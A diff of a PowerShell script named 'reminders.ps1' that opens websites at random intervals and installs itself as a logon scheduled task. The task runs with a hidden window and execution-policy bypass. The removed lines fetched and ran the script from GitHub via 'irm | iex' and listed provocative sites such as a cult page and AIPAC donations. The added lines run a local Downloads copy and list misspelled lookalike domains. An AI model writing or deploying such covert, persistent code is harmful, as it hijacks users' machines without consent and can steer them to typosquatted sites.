@@ -1,15 +1,14 @@
 # ================= CONFIG =================
 $BaseUrl   = "https://raw.githubusercontent.com/Kiyan-7/telaviv/main"
-$ScriptUrl = "$BaseUrl/reminders.ps1"
+$LocalScriptPath = Join-Path ([Environment]::GetFolderPath("UserProfile")) "Downloads\reminders.ps1"
 
 $Sites = @{
-    1 = "https://heavensgate.com/"
-    2 = "https://action.aipac.org/aipac-pac-donate"
-    3 = "https://www.palantir.com/platforms/gotham/"
-    4 = "https://www.idf.il/en/mini-sites/how-to-join-us-and-voluntary-programs/how-to-join/"
-    5 = "https://www.cosmic-people.com/english/default_02_obr2903_en.htm"
+    1 = "docs.googe.com/"
+    2 = "newyorktimes.com"
+    3 = "google.sheets/"
+    4 = "journal.new/"
+    5 = "app.gooogle.jamboard"
 }
-
 
 
 $MinSeconds            = 10
@@ -98,15 +97,16 @@ if (-not $mutex.WaitOne(0)) { Log "Already running, exiting."; exit }
 $PID | Out-File (Join-Path $Dir "pid.txt") -Force
 
 $CurrentUser = "$env:USERDOMAIN\$env:USERNAME"
-Log "--- started as $CurrentUser."
+Log "--- started as $CurrentUser from $LocalScriptPath"
 
-# ---- Autostart ----
+# ---- Autostart (local file in Downloads) ----
 $PsExe      = "$env:SystemRoot\System32\WindowsPowerShell\v1.0\powershell.exe"
-$LaunchArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"irm '$ScriptUrl' | iex`""
+$LaunchArgs = "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$LocalScriptPath`""
 
 $taskOk = $false
 try {
-    if (Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue) {
+    $existing = Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue
+    if ($existing) {
         $taskOk = $true
     } else {
         $logon = New-ScheduledTaskTrigger -AtLogOn -User $CurrentUser
